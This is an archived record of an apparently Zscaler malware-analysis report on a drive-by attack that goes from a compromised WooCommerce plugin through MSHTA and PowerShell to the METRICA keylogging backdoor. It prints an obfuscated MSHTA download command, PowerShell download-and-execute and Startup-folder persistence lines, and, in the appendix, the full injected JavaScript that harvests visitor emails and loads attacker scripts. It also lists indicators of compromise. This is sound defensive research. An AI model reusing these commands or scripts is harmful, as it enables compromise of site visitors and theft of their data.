{
    "id": "61c6c7ab-aa38-43a4-9817-5a6c257af6a8",
    "created_at": "2023-01-12T15:06:27.243121Z",
    "updated_at": "2025-03-27T02:13:29.167679Z",
    "deleted_at": null,
    "sha1_hash": "221bc77363ef9c2a616293a2c67bf07071e980f0",
    "title": "2021-03-23 - Low-volume multi-stage attack leveraging AzureEdge and Shopify CDNs",
    "authors": "",
    "file_creation_date": "2022-05-28T19:35:23Z",
    "file_modification_date": "2022-05-28T19:35:23Z",
    "file_size": 1704941,
    "plain_text": "# Low-volume multi-stage attack leveraging AzureEdge and Shopify CDNs\n\n**[zscaler.com/blogs/security-research/low-volume-multi-stage-attack-leveraging-azureedge-and-shopify-cdns](https://www.zscaler.com/blogs/security-research/low-volume-multi-stage-attack-leveraging-azureedge-and-shopify-cdns)**\n\n## Introduction\n\nIn Feb 2021, Threatlabz observed a few instances of a low-volume multi-stage web attack in\nZscaler cloud.\n\nThis web attack leveraged legitimate servers of Microsoft (azureedge.net), Dropbox and content\ndelivery network of Shopify (cdn.shopify.com) to host the malicious files. The attack chain started\nfrom a Wordpress site with a compromised plugin.\n\nWhen the victim browsed to the compromised e-commerce Wordpress site, the injected JavaScript\nin the WooCommerce plugin kick-started the infection chain.\n\nThe infection chain on the endpoint device consists of multiple stages involving the usage of\nMSHTA, PowerShell, C# backdoor which is also executed inline by PowerShell code. Based on\nour research, this threat actor is not yet documented anywhere and we have not attributed this to\nany known threat actor yet.\n\nWe have given the name - METRICA to the new C# backdoor discovered in this research.\n\nIn this blog, we describe technical details of the entire infection chain end-to-end.\n\n## Attack flow\n\n**Figure 1 shows the end-to-end attack flow which leads to the download of the final backdoor,**\nMETRICA.\n\n\n-----\n\n_Figure 1: Attack flow_\n\nAs shown in the above attack flow, in one of the observed instances of attacks, the user searched\nfor the string “steelcase adjustable arm” on the Google search engine. From the search results,\nuser navigated to the URL: officechairatwork[.]com/product/steelcase-think-chair-3d-knit-back-4way-adjustable-arms\n\n**Figure 2 shows officechairatwork[.]com, a legitimate Wordpress-based e-commerce website.**\n\n\n-----\n\n_Figure 2: e-Commerce Wordpress site._\n\nIt uses the WooCommerce order tracking Wordpress plugin. One of the JavaScripts for this plugin\nwas injected with malicious code. Interestingly, the injected code uses base64 encoding to prevent\nany suspicion.\n\n**URL of injected JavaScript:**\n\nhxxp://officechairatwork[.]com/wp-content/plugins/yith-woocommerce-ordertracking/assets/js/ywot.js?ver=5.6\n\n**Figure 3 shows the injected code.**\n\n\n-----\n\n_Figure 3: JavaScript code injected in the WooCommerce Wordpress plugin_\n\nThis injected code dynamically creates a script element using HTML DOM which adds an external\nJavaScript reference.\n\n\"script.src = 'https://metrica2.azureedge[.]net/tracking'\"\n\nThis results in the website loading the malicious code from above URL.\n\nIt ultimately redirects the user to the legitimate file-hosting site, Dropbox to download a ZIP archive\nwhich contains the malicious LNK file.\n\nURL: www.dropbox[.]com/s/3mrfasci8ibhms9/terms%20and%20conditions.zip?dl=1\n\n## Technical analysis\n\nFirst we will look at the malicious JavaScript code which was injected in the compromised\nWordpress plugin on the website and how it leverages multiple stages to redirect the user to the\nfinal download page.\n\n### Injected JavaScript analysis\n\n**Note: Please refer the Appendix section at the end of the blog for the complete JavaScript code**\nsnippets.\n\n**Stage-1 JavaScript**\n\n**URL: metrica2.azureedge[.]net/tracking**\n\nThe first stage JavaScript performs a few checks to determine the next stage JavaScript to be\nloaded. It contains references to four more JavaScripts which are explained in detail in this\nsection.\n\nStage 1 JavaScript code defines 3 functions:\n\n**1. load_path: Creates a dynamic script element in the DOM**\n\n**2. getMails: Performs regex to check if the given string input is in the standard email ID format.**\n\n**3. valid: It scans the page ‘input’ elements to retrieve the logged in user email ID.**\n\nExecution of the JavaScript code starts by retrieving two items from the browser’s sessionStorage\nwith names - ‘startDate’ and ‘startMail’.\n\nIt uses the above fetched values to perform following actions:\n\n**1. Checks if startDate is valid and if yes, then calculates the difference between current time and**\nsaved time(startDate). If the difference is less than 100 seconds then it calls the load_path function\nwhich in turn loads the next stage JavaScript from the path “metrica2.azureedge.net/lockpage”\n\n\n-----\n\n**2. If startDate is not valid then the function named valid is called in 500 milliseconds intervals to**\nretrieve the logged in user email ID. When the email ID is retrieved successfully, it calls the\nload_path function which in turn loads the next stage JavaScript from the path\n**“metrica2.azureedge.net/slashpage”**\n\n**Stage-2 JavaScript**\n\n**URL 1: metrica2.azureedge[.]net/lockpage**\n\nThe second stage JavaScript performs two operations:\n\n**1. Prepends a ‘div’ element with id ”slashpage” to the website’s main page and inserts an empty**\n‘iframe’ element with name “splashpage-iframe” to it.\n**2. Creates a dynamic script element in the DOM which loads the next stage JavaScript from the**\npath “metrica2.azureedge.net/PatternSite”\n\n**URL 2: metrica2.azureedge[.]net/slashpage**\n\nPerforms the same operations as /lockpage. In addition to that, it retrieves the startDate item from\nsessionStorage and if not found, sets it to the current date.\n\n**Stage-3 JavaScript**\n\n**URL: metrica2.azureedge[.]net/PatternSite**\n\nThe third stage JavaScript has configurable parameters that control the execution behaviour as\nwell as frequency of execution of the contained JavaScript code.\n\nThis stage of JavaScript is responsible for displaying or hiding a banner as a social engineering\ntechnique to lure the victim to download a malicious ZIP file.\n\nThe banner is displayed by configuring the ‘div’ and ‘iframe’ elements created by the second stage\nJavaScript. The source URL for the banner is\n“metrica2.azureedge.net/templates/template_2/modal_test2_animate_responsive_json.html”\n\n**Figure 4 shows the banner displayed to the user.**\n\n\n-----\n\n_Figure 4: Banner displayed to the user_\n\nWhen the user clicks the Continue button, it initiates the ZIP file download request in the\nbackground. As soon as the download request is sent, the banner content is also changed as\nshown in Figure 5.\n\n_Figure 5: Changed banner content pointing to open the downloaded file_\n\nThe downloaded ZIP file contains a LNK file inside which is executed by the user.\n\nFor the purpose of technical analysis, we will look at the LNK file with MD5 hash:\n**2d0f946bac9b565b15cb739473bd4b20**\n\nThis LNK was archived inside a ZIP file which was hosted on the Dropbox URL:\nwww.dropbox[.]com/s/3mrfasci8ibhms9/terms%20and%20conditions.zip?dl=1\n\nThe LNK file on execution used the following command line to fetch malicious VBScript code from\nattacker configured server on azureedge.net\n\n**Command line: %WINDIR%\\System32\\cmd.exe /c \"set a=start ms&&set b=hta ht&&set**\nc=tps://&&set d=web-google.azur&&set v=eedge.net/doc-YUSKQOPZUFD&call set\nf=%a%%b%%c%%d%%v%&&call %f%\"&&exit\n\nThe above command line will leverage MSHTA to download the malicious VBScript from the\n**URL: web-google.azureedge[.]net/doc-YUSKQOPZUFD**\n\nThe downloaded VBScript in turn will connect to the URL:\nstring.azureedge[.]net/doc49672.jpeg/ps1/9876/ to download the next stage PowerShell code.\n\n\n-----\n\nThe downloaded PowerShell code has C# code embedded inside it, which will be executed inline\nby the PowerShell code. This C# code is a backdoor which we have named as “METRICA”\n\n## METRICA backdoor analysis\n\nThe METRICA backdoor is executed inline using wrapped PowerShell code to make the backdoor\nexecution fileless.\n\n**Note: PowerShell natively supports inline C# execution. Using the following snippet of code, it is**\npossible to perform inline code execution of C#.\n\nAdd-Type -ReferencedAssemblies {Add any assembly references here} -TypeDefinition {Add C#\ncode here} -Language CSharp;\n\n**Figure 6 below shows the PowerShell code calling the C# code**\n\n_Figure 6: PowerShell code calling C# code_\n\nIn order to avoid static detection and hinder the analysis, the METRICA backdoor is generated on\nthe fly using a server-side generator (in the case of hosting service - azureedge.net).\n\nDue to this, each request to download the backdoor results in a backdoor with different size and\ndifferent static string obfuscation.\n\nIn case the backdoor is hosted on cdn.shopify.com, it is not generated on-the-fly but seems to be\nregularly updated by the attacker.\n\n**NOTE: This is likely because the azureedge.net hostings are directly owned by the attacker.**\n\n## Code analysis\n\nThe METRICA backdoor execution starts by calling its main function from the wrapper PowerShell\ncode.The main function takes the below 3 input parameters.\n\n-  A domain name\n\n-  Key which is used for encryption/decryption of data\n\n-  Default value to use for delay between the network requests\n\nIn the analysed sample following values were passed which can also be seen in Figure 6 above:\n\n\n-----\n\n-  Domain Name: https://global.asazure[.]windows.net\n\n-  Key: \"ENoztOORXAkUuWOkSdzLaRRL\"\n\n-  Default Delay Value: \"9567\"\n\nNote: Based on further analysis, we found that the ‘Key’ is configured per C2 server and is never\nsent as part of network communication.\n\nExecution of the main function performs the below operations.\n\n**1. Registers the infected machine to the C2 server. This is the bot registration stage.**\n**2. Creates a thread to perform keylogging and capture foreground/active window text.**\n**3. Starts the C2 communication and executes the command received by calling the required**\nfunction.\n\n**Figure 7 highlights the different operations performed by the main function**\n\n_Figure 7: Different operations performed by main function_\n\n### BOT registration\n\nBOT registration request is sent to the C2 server with the below information from the infected\nsystem.\n\n-  Generated BOT ID\n\n-  Computer Name\n\n-  User Domain\n\n-  UserName\n\nThe information collected is formatted as shown below.\n\n\n-----\n\nregister {BOT ID} {ComputerName}{DomainName}\\\\{UserName}\n\nFor more details about the network traffic, please refer to the network communication section of\nthe analysis.\n\n### Information collection and exfiltration\n\nMETRICA backdoor collects the following information from infected system\n\n-  Keystrokes\n\n-  Foreground/Active window text\n\nTo exfiltrate the logged information a Timer object is created which calls the log exfiltration function\nevery 5 seconds. This is done to maintain the fileless execution since the keystrokes and window\ntext information is stored in the memory and cleared as the information is exfiltrated.\n\nThe logged information is formatted as shown below.\n\nuserinput {Base64_encoded_logged_information}\n\n**Figure 8 highlights information logging and exfiltration operations**\n\n_Figure 8: Information logging and exfiltration operations_\n\nMore details about the network traffic are added in the Network Communication section of the\nanalysis.\n\n## Network communication\n\n\n-----\n\n**Initialization**\n\nMETRICA backdoor performs all the network communication over HTTPs. All web requests are\ncreated using the domain name which is passed as the first parameter to the main function\ndescribed earlier and a network path which is generated as a random string for every request.\n\nAfterwards following header fields are initialized:\n\n-  Method: “POST”\n\n-  UserAgent: Initialized with OS Version string\n\n-  Timeout: 10000\n\n-  Host: Attacked controlled endpoint on the CDN\n\n-  ProxyCredentials: Default Credentials\n\n**Request/Response Format**\n\nAll the network requests/responses use the following format:\n\n{\n**UUID: “Unique identifier for every exfiltration request/response pair”,**\n\n**ID: “BOT ID of the infected machine”,**\n\n**DATA: “Encrypted and Base64 encoded data”**\n\n}\n\n**BOT registration request**\n\nLike every other backdoor the first network request is of BOT registration. Data sent as part of the\nrequest is already described in the BOT registration section. No UUID is used in the registration\nrequest.\n\n**C2 Commands**\n\nThe network request to fetch the C2 command is sent at regular intervals. The UUID and the DATA\nfield are empty for all such network requests.\n\nBased on the C2 response from the server different operations are performed. The METRICA\nbackdoor checks if the UUID field in the response is set or not. If the UUID field is set, it decrypts\nthe response data specified in the DATA field.The decrypted data then specifies the command to\nbe executed.\n\nThe table below describes the backdoor supported commands and corresponding action\nperformed.\n\n**Command** **Action Performed**\n\ndelay Updates the time delay between the network requests\n\n\n-----\n\nscreenshot Capture screenshot of all the connected screens and send to the C2\nserver\n\nexit Stop fetching new commands from the C2 server\n\n\nRaw PowerShell\ncommand\n\n\nExecute the raw PowerShell command and send the output to the C2\nserver\n\n\n**1.** **delay**\n\nUpdates the time delay between the network requests with the C2 server specified value. No\nnetwork response is sent back.\n\n**2.** **screenshot**\n\nFor all the available screens capture screenshot and send to the C2 server one at a time. To\nmaintain the fileless execution the screenshot is saved in memory and sent to the C2 server.\n\n**3.** **exit**\nSets a boolean variable which breaks the C2 communication loop. No network response is sent\nback.\n\n**4.** **Raw PowerShell command**\n\nExecutes the raw PowerShell command and sends the result back to the C2 server.\n\nTo execute the PowerShell command from C# code a Runspace is created. A Pipeline is opened\nto the created Runspace. The pipeline is then used to specify the PowerShell command to be\nexecuted and also configure the Runspace to send the output back to the C# code. The output is\nthen sent to the C2 server.\n\n**[Note: To read more about Runspace check this article.](https://harrietgl.wordpress.com/2013/09/13/how-to-runspace-part-1/)**\n\n### Persistence\n\nAchieves persistence by leveraging PowerShell code to download a new LNK file from Dropbox\nand dropping it in the Startup directory. The PowerShell code is broken into two stages:\n\n-  First stage PowerShell code is sent as a C2 command which downloads and executes the\nsecond stage PowerShell code from the specified remote location.\n\n-  The second stage PowerShell code downloads the new LNK and drops it in the Startup\ndirectory.\n\n**First stage PowerShell code sent as C2 command: IEX (New-Object**\nNet.Webclient).downloadstring('https://www.dropbox.com/s/qmdiqv2djdkap4y/lnkobv.t?dl=1')\n\n**Second stage PowerShell code for downloading new LNK and dropping it in the Startup**\n**directory:**\n\n$client = new-object\n\n\n-----\n\nSystem.Net.WebClient;$client.DownloadFile( https://www.dropbox.com/s/tfy1pd5et10jfg3/Startup_tor?\ndl=1\",\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Startup.lnk\");\n\n**Note: The reason for achieving persistence only by specifying the C2 command could be to avoid**\npersistent infection in case the victim profile is not of any interest to the attacker. Further the entire\nattack chain is fileless except the initial ZIP download so it also helps lower the fingerprints in the\ninfected system.\n\n## Zscaler Sandbox report\n\n**Figure 9 shows the Zscaler Cloud Sandbox successfully detonating and detecting this threat.**\n\n_Figure 9: Zscaler Sandbox report_\n\nIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators\nat various levels.\n\n## MITRE ATT&CK TTP Mapping\n\n**ID** **Tactic** **Technique**\n\nT1566.001 Drive-by Compromise Compromised plugin JavaScript file\n\nT1204.002 User Execution: Malicious File User opens the downloaded ZIP file and\nexecutes the contained LNK\n\n\n-----\n\nT1059 Command and Scripting\nInterpreter\n\nT1547.001 Registry Run Keys / Startup\nFolder\n\nT1140 Deobfuscate/Decode Files or\nInformation\n\n\nExecutes malicious JavaScript and PowerShell\ncode\n\n\nStrings and other data are obfuscated in the\npayloads\n\n\nCreates LNK file in the startup folder for\npersistence\n\n\nT1218 Signed Binary Proxy Execution Uses mshta to execute the VBScript code\n\n\nT1027.002 Obfuscated Files or Information:\nSoftware Packing\n\n\nPayloads are packed in layers\n\n\nT1082 System Information Discovery Gathers system OS version info\n\nT1033 System Owner/User Discovery Gathers currently logged in Username\n\nT1113 Screen Capture Capture Screenshot of all the connected\nscreens\n\nT1056 Input Capture Capture keystrokes and foreground window\ntext\n\n\nT1132.001 Data Encoding: Standard\nEncoding\n\nT1071.001 Application Layer Protocol: Web\nProtocols\n\n\nUses Base64 encoding for data exfiltration\n\n\nUses https for C2 communication\n\n\nT1041 Exfiltration Over C2 Channel Data is exfiltrated using existing C2 channel\n\n## Indicators of compromise\n\n**Hashes**\n\n**// ZIP**\n\n53558b99cbfe6f99dd1597e21b49b07e\n\nd6fb36a86aec32f17220050da903a0ce\n\n**//LNK**\n\n2d0f946bac9b565b15cb739473bd4b20\n\n272edc017f01eef748429358b229519b\n\n\n-----\n\n**ZIP File download links**\n\nwww.dropbox[.]com/s/3mrfasci8ibhms9/terms%20and%20conditions.zip?dl=1\nwww.dropbox[.]com/s/g2hw0s5qec1kvzs/terms%20and%20conditions.zip?dl=1\n**Intermediate stage payload hosting**\n\n**// MD5: 2d0f946bac9b565b15cb739473bd4b20**\nhxxps://web-google.azureedge[.]net/doc-YUSKQOPZUFD\nhxxps://cdn.shopify.com/s/files/1/0536/1506/7334/t/1/assets/ThemeStyleSheet.html\nhxxps://string.azureedge[.]net/doc49672.jpeg/ps1/9876/\n\n**// MD5: 272edc017f01eef748429358b229519b**\nhxxps://compos17.azureedge.net/doc-YUSKQOPZUFD\nhxxps://cdn.shopify.com/s/files/1/0541/9879/6463/t/1/assets/GjndThgbnys.html\nhxxps://cdn.shopify.com/s/files/1/0541/9879/6463/t/1/assets/igRoQOJgupOQ.html\n\n**// Persistence LNK**\nhxxps://cdn.shopify.com/s/files/1/0536/1506/7334/t/1/assets/ThemeBodyFile.html\nhxxps://theme.azureedge[.]net/microsoft.jpeg/ps1/9567/\n\n**C2 domains**\n\n**// POST method used for communication**\n\nstring.azureedge.net\ntheme.azureedge.net\natlant18.azureedge.net\n\n**JavaScript files**\n\nmetrica2[.]azureedge[.]net/tracking\nmetrica2[.]azureedge[.]net/PatternSite\nmetrica2[.]azureedge[.]net/PatternSiteLock\nmetrica2[.]azureedge[.]net/lockpage\nmetrica2[.]azureedge[.]net/slashpage\n\n**Banner hosting**\n\nmetrica2[.]azureedge[.]net/templates/template_2/modal_test2_animate_responsive_json.html\n\n**Dropped Filenames and full paths**\n\nTerms And Conditions.zip\nTerms And Conditions.lnk\n{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Startup.lnk\n\n**OSINT submissions**\n\n**Hashes**\n\n\n-----\n\n**//ZIP**\nb0cf113c0eddd55aa536c75e6ac4d670\n8593e4d458ef4fc6ca35b1138c9e37a4\n\n**//LNK**\n2e68d6a2b29a12de919bfd936ee62d7b\n422a4fc87fece907f93daa4d3e23f907\n\n**Intermediate stage payload hosting**\n\nhxxps://doc-web1.azureedge[.]net/doc-YUSKQOPZUFD\nhxxps://compos20.azureedge[.]net/doc-YUSKQOPZUFD\n\n## Appendix\n\n**//Stage-1 JavaScript**\n\nstartDate = sessionStorage.getItem('startDate');\n\nstartMail = sessionStorage.getItem('startMail');\n\nvar metrica_path = 'metrica2.azureedge.net/PatternSite';\n\nvar metrica_path_lock = 'metrica2.azureedge.net/PatternSiteLock';\n\nvar metrica_lock = 'metrica2.azureedge.net/lockpage';\n\nvar metrica_slashpage = 'metrica2.azureedge.net/slashpage';\n\nfunction load_path(metrica, email){\nvar metricasrc = document.createElement('script');\n\nmetricasrc.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + metrica + '?q=' +\nencodeURIComponent(email);\n\ndocument.getElementsByTagName(\"html\")[0].appendChild(metricasrc);\n\n}\n\nfunction getEmails(search_in) {\n\n[array_mails = search_in.toString().match(/([a-zA-Z0-9._-][email protected][a-zA-Z0-9._-]+\\.[a-zA-](https://www.zscaler.com/cdn-cgi/l/email-protection)\nZ0-9._-]+)/gi);\n\nif(array_mails !== null){\n\nreturn array_mails[0];\n\n}\n\nelse{\n\nreturn '';\n\n}\n\n}\n\nif (startDate) {\n\nstartDate = new Date(startDate);\n\n}\n\n\n-----\n\nif (startDate != null && Math.trunc((new Date() - startDate)/1000) < 100) {\nemail = startMail;\nload_path(metrica_lock, email);\n}\n\nif (startDate == null){\nvar is_email = 0;\nvar forminput = document.querySelectorAll('input');\nfunction valid(){\nfor(var i = 0; i < forminput.length; i++) {\nif (forminput[i].type=='email' || forminput[i].type=='text'){\nif (forminput[i] != document.activeElement) {\nvar email = getEmails(forminput[i].value);\nif(email != ''){\nstartMail = sessionStorage.getItem('startMail');\nif (startMail) {\nstartMail = email;\n} else {\nstartMail = email;\nsessionStorage.setItem('startMail', startMail);\n}\nload_path(metrica_slashpage, email);\nclearInterval(myVar);\nreturn;\n}\n}\n}\n}\n}\nvar myVar = setInterval(valid, 500);\n}\n\n**//Stage-2 JavaScript**\n\nstartDate = sessionStorage.getItem('startDate');\n\nif (startDate) {\nstartDate = new Date(startDate);\n} else {\nstartDate = new Date();\nsessionStorage.setItem('startDate', startDate);\n}\n\nvar formdiv = document.querySelector('body');\nvar pagediv = document.createElement('div');\npagediv.id = 'slashpage';\npagediv.style = 'position:absolute;z-index:100000;';\n\n\n-----\n\npagediv.innerHTML = <iframe name= splashpage-iframe src= about:blank\nstyle=\"margin:0;border:0;padding:0;width:100%;height:100%\" ></iframe><br />&nbsp;'\nformdiv.insertBefore(pagediv, formdiv.firstChild);\nvar metricasslash = document.createElement('script');\nmetricasslash.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + metrica_path + '?\nq=' + encodeURIComponent(startMail);\ndocument.getElementsByTagName(\"html\")[0].appendChild(metricasslash);\n\n**//Stage-3 JavaScript**\n\nvar splashpage = {\nsplashenabled: 1,\nsplashpageurl:\n\"//metrica2.azureedge.net/templates/template_2/modal_test2_animate_responsive_json.html\",\nenablefrequency: 0,\ndisplayfrequency: \"2 days\",\ncookiename: [\"splashpagecookie\", \"path=/\"],\nautohidetimer: 0,\nlaunch: false,\nbrowserdetectstr:(window.opera && window.getSelection) || (!window.opera &&\nwindow.XMLHttpRequest),\n\noutput: function(){\nthis.splashpageref = document.getElementById(\"slashpage\");\nthis.splashiframeref = window.frames[\"splashpage-iframe\"];\nthis.splashiframeref.location.replace(this.splashpageurl);\nthis.standardbody = (document.compatMode == \"CSS1Compat\") ?\ndocument.documentElement : document.body;\nif(!/safari/i.test(navigator.userAgent)) this.standardbody.style.overflow = \"hidden\";\nthis.splashpageref.style.left = 0;\nthis.splashpageref.style.top = 0;\nthis.splashpageref.style.width = \"100%\";\nthis.splashpageref.style.height = \"100%\";\nthis.moveuptimer = setInterval(\"window.scrollTo(0,0)\", 50);\n},\n\ncloseit: function(){\nclearInterval(this.moveuptimer);\nthis.splashpageref.style.display = \"none\";\nthis.splashiframeref.location.replace(\"about:blank\");\nthis.standardbody.style.overflow = \"auto\";\n},\n\ninit: function(){\nif(this.enablefrequency == 1){\nif(/sessiononly/i.test(this.displayfrequency)){\n\nif(this.getCookie(this.cookiename[0] + \" s\") == null){\n\n\n-----\n\nthis.setCookie(this.cookiename[0] + _s, loaded );\nthis.launch = true;\n}\n}\nelse if(/day/i.test(this.displayfrequency)){\nif(this.getCookie(this.cookiename[0]) == null ||\nparseInt(this.getCookie(this.cookiename[0])) != parseInt(this.displayfrequency)){\nthis.setCookie(this.cookiename[0], parseInt(this.displayfrequency),\nparseInt(this.displayfrequency));\nthis.launch = true;\n}\n}\n} else this.launch = true; if(this.launch){\nthis.output();\nif(parseInt(this.autohidetimer) > 0) setTimeout(\"splashpage.closeit()\",\nparseInt(this.autohidetimer) * 1000);\n}\n},\n\ngetCookie: function(Name){\nvar re = new RegExp(Name + \"=[^;]+\", \"i\");\nif(document.cookie.match(re)) return document.cookie.match(re)[0].split(\"=\")[1];\nreturn null;\n},\n\nsetCookie: function(name, value, days){\nvar expireDate = new Date();\nif(typeof days != \"undefined\"){\nvar expstring = expireDate.setDate(expireDate.getDate() + parseInt(days));\ndocument.cookie = name + \"=\" + value + \"; expires=\" + expireDate.toGMTString() + \"; \" +\nsplashpage.cookiename[1];\n} else document.cookie = name + \"=\" + value + \"; \" + splashpage.cookiename[1];\n}\n};\n\nif(splashpage.browserdetectstr && splashpage.splashenabled == 1) splashpage.init();\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-23 - Low-volume multi-stage attack leveraging AzureEdge and Shopify CDNs.pdf"
    ],
    "report_names": [
        "2021-03-23 - Low-volume multi-stage attack leveraging AzureEdge and Shopify CDNs.pdf"
    ],
    "threat_actors": [
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535987,
    "ts_updated_at": 1743041609,
    "ts_creation_date": 1653766523,
    "ts_modification_date": 1653766523,
    "files": {
        "pdf": "https://archive.orkl.eu/221bc77363ef9c2a616293a2c67bf07071e980f0.pdf",
        "text": "https://archive.orkl.eu/221bc77363ef9c2a616293a2c67bf07071e980f0.txt",
        "img": "https://archive.orkl.eu/221bc77363ef9c2a616293a2c67bf07071e980f0.jpg"
    }
}